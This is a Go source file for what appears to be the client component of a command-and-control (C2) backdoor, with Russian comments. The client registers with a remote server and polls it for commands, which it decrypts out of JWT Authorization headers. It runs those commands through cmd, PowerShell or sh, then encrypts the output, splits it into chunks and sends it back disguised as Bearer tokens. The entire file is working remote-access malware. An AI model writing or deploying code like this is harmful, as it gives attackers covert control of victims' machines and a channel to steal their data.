// Package client содержит бизнес-логику C2-клиента.
// Регистрация, опрос задач, выполнение команд, отправка результатов.
package client

import (
	"bytes"
	"c2-project/internal/chunk"
	"c2-project/internal/compress"
	"c2-project/internal/crypto"
	"c2-project/internal/jwt"
	"c2-project/internal/models"
	"c2-project/internal/protocol"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"golang.org/x/text/encoding/charmap"
	"golang.org/x/text/transform"
)

// Config - конфигурация клиента.
type Config struct {
	ServerURL    string `json:"server_url"`
	ClientID     string `json:"client_id"`
	PollInterval int    `json:"poll_interval"`
}

// Service - сервис клиента.
type Service struct {
	config Config
	client *http.Client
}

// NewService - создаёт новый сервис клиента.
// Загружает конфиг из указанного файла и переопределяет ClientID если нужно.
func NewService(configFile string, clientIDOverride string) (*Service, error) {
	// Загружаем конфиг
	file, err := os.Open(configFile)
	if err != nil {
		return nil, fmt.Errorf("failed to open config: %w", err)
	}
	defer file.Close()

	var cfg Config
	if err := json.NewDecoder(file).Decode(&cfg); err != nil {
		return nil, fmt.Errorf("failed to decode config: %w", err)
	}

	// Переопределяем ClientID если указан
	if clientIDOverride != "" {
		cfg.ClientID = clientIDOverride
		log.Printf("[INFO] Client ID overridden to: %s", cfg.ClientID)
	}

	return &Service{
		config: cfg,
		client: &http.Client{Timeout: 10 * time.Second},
	}, nil
}

// Run - запускает основной цикл клиента.
// Регистрируется, затем периодически опрашивает задачи и выполняет их.
func (s *Service) Run() error {
	log.Printf("[START] Client %s starting...", s.config.ClientID)

	// Регистрация
	if err := s.register(); err != nil {
		return fmt.Errorf("registration failed: %w", err)
	}
	log.Println("[OK] Registration successful")

	// Основной цикл
	for {
		task, err := s.poll()
		if err != nil {
			log.Printf("[ERROR] Poll error: %v", err)
			time.Sleep(time.Duration(s.config.PollInterval) * time.Second)
			continue
		}

		if task.ID == "" {
			time.Sleep(time.Duration(s.config.PollInterval) * time.Second)
			continue
		}

		// Выполняем задачу
		output, err := s.execute(task.Command)
		status := "completed"
		if err != nil {
			status = "failed"
			output = err.Error()
		}

		// Отправляем результат
		if err := s.sendResult(task.ID, output, status); err != nil {
			log.Printf("[ERROR] Failed to send result: %v", err)
		}

		time.Sleep(1 * time.Second)
	}
}

// Close - штатное завершение работы клиента.
func (s *Service) Close() error {
	log.Printf("[STOP] Client %s stopping...", s.config.ClientID)
	// Здесь можно добавить сохранение состояния, закрытие соединений и т.д.
	return nil
}

// register - регистрирует клиента на сервере.
func (s *Service) register() error {
	token, err := jwt.EncodeClientID(s.config.ClientID)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", s.config.ServerURL+"/api/register", bytes.NewReader([]byte("{}")))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// poll - опрашивает сервер на наличие задач.
func (s *Service) poll() (models.Task, error) {
	token, err := jwt.EncodeClientID(s.config.ClientID)
	if err != nil {
		return models.Task{}, err
	}

	req, err := http.NewRequest("POST", s.config.ServerURL+"/api/poll", bytes.NewReader([]byte("{}")))
	if err != nil {
		return models.Task{}, err
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := s.client.Do(req)
	if err != nil {
		return models.Task{}, err
	}
	defer resp.Body.Close()

	// Проверяем статус
	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	status, _ := result["status"].(string)

	if status == "no_tasks" {
		return models.Task{}, nil
	}

	// Извлекаем токен задачи
	authHeader := resp.Header.Get("Authorization")
	taskToken := getTokenFromBearer(authHeader)
	if taskToken == "" {
		return models.Task{}, nil
	}

	// Расшифровываем задачу
	data, err := protocol.DecodeRequest(taskToken)
	if err != nil {
		return models.Task{}, err
	}

	jsonData, _ := json.Marshal(data)
	var task models.Task
	json.Unmarshal(jsonData, &task)

	// Распаковываем команду если сжата
	if task.Command != "" {
		if decompressed, err := compress.Decompress([]byte(task.Command)); err == nil {
			task.Command = string(decompressed)
		}
	}

	log.Printf("[DECRYPT] Task decrypted: %s", task.Command)
	return task, nil
}

// execute - выполняет команду в оболочке.
func (s *Service) execute(cmd string) (string, error) {
	if len(strings.TrimSpace(cmd)) == 0 {
		return "", fmt.Errorf("empty command")
	}

	var output []byte
	var err error

	if runtime.GOOS == "windows" {
		hasPipe := false
		for i := 0; i < len(cmd); i++ {
			if cmd[i] == '|' {
				if i+1 < len(cmd) && cmd[i+1] == '|' {
					continue
				}
				if i > 0 && cmd[i-1] == '|' {
					continue
				}
				hasPipe = true
				break
			}
		}

		if hasPipe {
			psCmd := cmd
			psCmd = strings.ReplaceAll(psCmd, " && ", " ; ")
			psCmd = strings.ReplaceAll(psCmd, " || ", " ; ")
			psExec := exec.Command("powershell", "-Command", psCmd)
			output, err = psExec.CombinedOutput()
			if err != nil && len(output) == 0 {
				return string(output), err
			}
		} else {
			cmdCmd := exec.Command("cmd", "/c", cmd)
			output, err = cmdCmd.CombinedOutput()
			if err != nil && len(output) == 0 {
				return string(output), err
			}
		}

		// Конвертируем CP866 → UTF-8
		if len(output) > 0 {
			decoder := charmap.CodePage866.NewDecoder()
			if utf8Output, _, convErr := transform.Bytes(decoder, output); convErr == nil {
				output = utf8Output
			}
			output = bytes.ReplaceAll(output, []byte("?"), []byte(" "))
		}
	} else {
		shCmd := exec.Command("sh", "-c", cmd)
		output, err = shCmd.CombinedOutput()
		if err != nil && len(output) == 0 {
			return string(output), err
		}
	}

	// Сжимаем если длинный
	if len(output) > 5000 {
		if compressed, err := compress.Compress(output); err == nil {
			return string(compressed), nil
		}
	}
	return string(output), nil
}

// sendResult - отправляет результат выполнения на сервер.
func (s *Service) sendResult(taskID, output, status string) error {
	result := map[string]interface{}{
		"task_id": taskID,
		"output":  output,
		"status":  status,
	}

	jsonData, err := json.Marshal(result)
	if err != nil {
		return err
	}

	encrypted, err := crypto.Encrypt(jsonData)
	if err != nil {
		return err
	}

	// Если данные небольшие — отправляем как есть
	if len(encrypted) <= 1024 {
		token, err := jwt.Encode(encrypted)
		if err != nil {
			return err
		}
		return s.sendChunk("Bearer " + token)
	}

	// Разбиваем на чанки
	chunks, _ := chunk.Split(encrypted, 1024)
	for i, c := range chunks {
		chunkData, err := json.Marshal(c)
		if err != nil {
			continue
		}
		chunkEncrypted, err := crypto.Encrypt(chunkData)
		if err != nil {
			continue
		}
		token, err := jwt.Encode(chunkEncrypted)
		if err != nil {
			continue
		}
		s.sendChunk("Bearer " + token)
		log.Printf("[CHUNK] Sent chunk %d/%d", i+1, len(chunks))
		time.Sleep(100 * time.Millisecond)
	}
	return nil
}

// sendChunk - отправляет один чанк на сервер.
func (s *Service) sendChunk(token string) error {
	req, err := http.NewRequest("POST", s.config.ServerURL+"/api/results", bytes.NewReader([]byte("{}")))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// getTokenFromBearer - извлекает токен из заголовка Authorization.
func getTokenFromBearer(authHeader string) string {
	parts := strings.SplitN(authHeader, " ", 2)
	if len(parts) != 2 || parts[0] != "Bearer" {
		return ""
	}
	return parts[1]
}
